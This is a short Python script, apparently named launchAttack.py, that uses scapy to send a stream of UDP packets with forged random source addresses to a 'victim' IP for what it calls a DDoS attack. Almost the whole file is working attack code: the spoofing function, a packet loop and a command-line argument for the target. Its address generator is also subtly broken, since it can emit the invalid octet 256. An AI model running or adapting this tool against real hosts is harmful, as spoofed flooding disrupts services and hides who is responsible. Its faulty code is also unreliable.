import sys
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from os import popen
from scapy.all import sendp, IP, UDP, Ether
from random import randint
from argparse import ArgumentParser

def getSrcRandomIP():
    invalid_ip = [10, 127, 256, 1, 2, 169, 172, 192]
    first_ip = randint(1, 256)
    while first_ip in invalid_ip:
        first_ip = randint(1, 256) 
    src_ip = '.'.join([str(first_ip), str(randint(1,256)), str(randint(1,256)), str(randint(1,256))])
    return src_ip

def main(dst_ip):
    if(dst_ip is None):
        print('Type the following command to get some help\npython3 launchAttack.py --h')
        exit(0)
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    NUM_PACKET = 800
    D_PORT = 5
    S_PORT = 80                                                        
    for i in range(NUM_PACKET):
        packets = Ether() / IP(dst=dst_ip, src=getSrcRandomIP()) / UDP(dport = D_PORT, sport=S_PORT)
        sendp(packets, iface=interface.rstrip(), inter=0.2)
        print(f'Send attacking packet: {repr(packets)}')


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--dst_ip', type=str, help='The victim ip of DDOS attack.')
    args = parser.parse_args()
    main(**vars(args))